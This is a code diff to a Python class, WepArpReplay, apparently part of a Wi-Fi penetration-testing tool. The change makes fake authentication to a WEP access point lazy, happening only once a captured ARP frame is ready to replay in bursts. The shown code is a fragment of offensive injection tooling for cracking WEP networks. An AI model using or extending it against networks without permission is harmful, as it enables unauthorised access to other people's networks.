@@ -31,11 +31,15 @@ import logging
 import os
 import time
 from dataclasses import dataclass, field
-from typing import Callable, List, Optional
+from typing import Awaitable, Callable, List, Optional
 
 from wifit3.engine.models import AccessPoint
 
 logger = logging.getLogger(__name__)
+
+
+async def _always_associated() -> bool:
+    return True
 
 
 def _str_to_mac(s: str) -> bytes:
@@ -100,7 +104,7 @@ class WepArpReplay:
         target: AccessPoint,
         collector,
         source_mac: Optional[bytes] = None,
-        can_inject: Optional[Callable[[], bool]] = None,
+        ensure_associated: Optional[Callable[[], Awaitable[bool]]] = None,
         notify_activity: Optional[Callable[[], None]] = None,
         request_reauth: Optional[Callable[[], None]] = None,
         log_callback: Optional[Callable[[str], None]] = None,
@@ -113,7 +117,9 @@ class WepArpReplay:
         # captured ARP's encrypted body is re-addressed under this MAC.
         self.source_mac = source_mac or (bytes([0x02]) + os.urandom(5))
         self.collector = collector
-        self._can_inject = can_inject or (lambda: True)
+        # Awaited right before a burst — authenticates lazily (returns True iff
+        # associated). We only call it once we actually have an ARP to send.
+        self._ensure_associated = ensure_associated or _always_associated
         self._notify_activity = notify_activity or (lambda: None)
         self._request_reauth = request_reauth or (lambda: None)
         self._log = log_callback or (lambda _m: None)
@@ -222,11 +228,9 @@ class WepArpReplay:
                     self._set_state("paused")
                     await asyncio.sleep(0.2)
                     continue
-                if not self._can_inject():
-                    self._set_state("waiting-auth")
-                    await asyncio.sleep(0.2)
-                    continue
 
+                # Find an ARP to replay FIRST — only then is it worth
+                # authenticating (no eager fake-auth with nothing to send).
                 # A confirmed winner is replayed forever — WEP frames never
                 # expire, so don't drop it just because it aged out of the
                 # constantly-churning capture ring (our own replays make the AP
@@ -243,6 +247,12 @@ class WepArpReplay:
                         continue
                     if self._current is not cand:
                         self._begin_trial(cand)
+
+                # We have something to send — now (lazily) associate.
+                if not await self._ensure_associated():
+                    self._set_state("waiting-auth")
+                    await asyncio.sleep(0.3)
+                    continue
 
                 gain = await self._burst_window(self._current)
                 self._trial_gain += gain
